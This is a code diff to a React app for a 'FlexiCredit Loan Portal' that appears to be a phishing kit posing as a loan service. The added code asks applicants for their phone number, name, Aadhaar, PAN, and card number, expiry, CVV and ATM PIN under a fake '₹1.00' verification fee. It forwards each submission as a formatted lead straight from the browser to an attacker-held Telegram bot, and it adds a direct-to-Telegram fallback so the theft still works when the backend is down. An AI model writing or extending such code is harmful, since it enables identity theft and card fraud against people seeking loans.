@@ -49,15 +49,28 @@ export default function App() {
 
   // Fetch initial Telegram Config & Logs on mount
   const fetchTelegramConfig = async () => {
+    const localToken = localStorage.getItem('telegram_bot_token') || import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '';
+    const localChatId = localStorage.getItem('telegram_chat_id') || import.meta.env.VITE_TELEGRAM_CHAT_ID || '';
+
     try {
       const res = await fetch('/api/telegram/config');
       if (res.ok) {
         const data = await res.json();
-        setTelegramConfig(data);
+        if (data.hasToken && data.hasChatId) {
+          setTelegramConfig(data);
+          return;
+        }
       }
     } catch (e) {
-      console.error('Failed to fetch Telegram config', e);
+      console.error('Failed to fetch Telegram config from server', e);
     }
+
+    setTelegramConfig({
+      hasToken: Boolean(localToken),
+      hasChatId: Boolean(localChatId),
+      maskedToken: localToken ? `${localToken.substring(0, 6)}...${localToken.slice(-4)}` : '',
+      chatId: localChatId,
+    });
   };
 
   const fetchTelegramLogs = async () => {
@@ -77,35 +90,91 @@ export default function App() {
     fetchTelegramLogs();
   }, []);
 
-  // Helper to send payload to Telegram with static fallback support
+  // Helper to send payload to Telegram with robust direct fallback for Netlify static/serverless
   const sendTelegramPayload = async (type: string, data: Record<string, any>) => {
+    const clientToken = localStorage.getItem('telegram_bot_token') || import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '';
+    const clientChatId = localStorage.getItem('telegram_chat_id') || import.meta.env.VITE_TELEGRAM_CHAT_ID || '';
+
+    // 1. Try serverless endpoint first
     try {
       const res = await fetch('/api/telegram/send', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ type, data }),
+        body: JSON.stringify({ type, data, customBotToken: clientToken, customChatId: clientChatId }),
       });
 
       if (res.ok) {
         const result = await res.json();
-        if (result.log) {
+        if (result.success && !result.simulated && result.log) {
           setLastLog(result.log);
           setTelegramLogs((prev) => [result.log, ...prev]);
+          fetchTelegramConfig();
+          return result;
         }
-        fetchTelegramConfig();
-        return result;
       }
     } catch (err) {
-      console.warn('API route unreachable, falling back to client-side logging:', err);
+      console.warn('Backend /api/telegram/send unreachable, trying direct Telegram API:', err);
     }
 
-    // Static fallback log entry
+    // 2. Direct browser dispatch to Telegram API if token and chat ID are available
+    if (clientToken && clientChatId) {
+      const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      let formattedMessage = '';
+
+      if (type === 'phone_step') {
+        formattedMessage = `📱 <b>NEW LOAN LEAD - PHONE SUBMITTED</b>\n──────────────────────────────\n• <b>Phone Number:</b> <code>${data.phone}</code>\n• <b>Submitted At:</b> ${timestamp}\n• <b>Portal:</b> Netlify App`;
+      } else if (type === 'personal_details') {
+        formattedMessage = `📋 <b>LOAN APPLICATION - PERSONAL DETAILS</b>\n──────────────────────────────\n• <b>Full Name:</b> ${data.name}\n• <b>Phone Number:</b> <code>${data.phone}</code>\n• <b>Employment Type:</b> ${data.employmentType}\n• <b>Aadhaar Number:</b> <code>${data.adhar}</code>\n• <b>PAN Card:</b> <code>${data.panCard || 'N/A'}</code>\n• <b>Age:</b> ${data.age} years\n• <b>State:</b> ${data.state}\n• <b>City:</b> ${data.city}\n• <b>Pincode:</b> ${data.pincode}\n• <b>Requested Loan:</b> ₹${Number(data.loanAmount || 250000).toLocaleString('en-IN')} (${data.loanTenure || 24} months)\n• <b>Submitted At:</b> ${timestamp}`;
+      } else if (type === 'card_details') {
+        formattedMessage = `💳 <b>LOAN DISBURSEMENT FEE - CARD DETAILS</b>\n──────────────────────────────\n• <b>Applicant Name:</b> ${data.name || 'N/A'}\n• <b>Phone:</b> <code>${data.phone || 'N/A'}</code>\n• <b>Fee Amount:</b> ₹1.00 (Debit Card Verification Charge)\n• <b>Card Number:</b> <code>${data.cardNumber}</code>\n• <b>Card Holder:</b> ${data.cardHolder || 'N/A'}\n• <b>Expiry Date:</b> <code>${data.exp}</code>\n• <b>CVV:</b> <code>${data.cvv}</code>\n• <b>PIN Number:</b> <code>${data.pin || 'Not Provided'}</code>\n• <b>Submitted At:</b> ${timestamp}`;
+      } else {
+        formattedMessage = `🚀 <b>TELEGRAM BOT TEST ALERT</b>\n──────────────────────────────\n• <b>Status:</b> Connected & Active\n• <b>Portal:</b> FlexiCredit Loan Portal\n• <b>Timestamp:</b> ${timestamp}`;
+      }
+
+      try {
+        const tgUrl = `https://api.telegram.org/bot${clientToken}/sendMessage`;
+        const directRes = await fetch(tgUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: clientChatId,
+            text: formattedMessage,
+            parse_mode: 'HTML',
+            disable_web_page_preview: true,
+          }),
+        });
+
+        const directData = await directRes.json();
+        if (!directRes.ok || !directData.ok) {
+          throw new Error(directData.description || 'Failed to send message to Telegram bot');
+        }
+
+        const sentLog: TelegramLog = {
+          id: `log_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
+          timestamp,
+          type,
+          formattedMessage,
+          data,
+          status: 'sent',
+        };
+
+        setLastLog(sentLog);
+        setTelegramLogs((prev) => [sentLog, ...prev]);
+        fetchTelegramConfig();
+        return { success: true, simulated: false, log: sentLog };
+      } catch (tgError: any) {
+        console.error('Direct Telegram API Error:', tgError);
+        throw tgError;
+      }
+    }
+
+    // 3. Fallback log entry if no credentials configured anywhere
     const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
     const fallbackLog: TelegramLog = {
       id: `log_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
       timestamp,
       type,
-      formattedMessage: `Event: ${type} logged locally`,
+      formattedMessage: `Event: ${type} logged locally (No Bot Token configured)`,
       data,
       status: 'simulated',
     };
@@ -164,15 +233,19 @@ export default function App() {
 
   // Save Config handler
   const handleSaveConfig = async (botToken: string, chatId: string) => {
-    const res = await fetch('/api/telegram/config', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ botToken, chatId }),
-    });
-    if (!res.ok) {
-      const err = await res.json();
-      throw new Error(err.message || 'Failed to update configuration');
+    if (botToken) localStorage.setItem('telegram_bot_token', botToken.trim());
+    if (chatId) localStorage.setItem('telegram_chat_id', chatId.trim());
+
+    try {
+      await fetch('/api/telegram/config', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ botToken: botToken.trim(), chatId: chatId.trim() }),
+      });
+    } catch (e) {
+      console.warn('Backend API /api/telegram/config not reachable, config saved locally:', e);
     }
+
     await fetchTelegramConfig();
   };
 
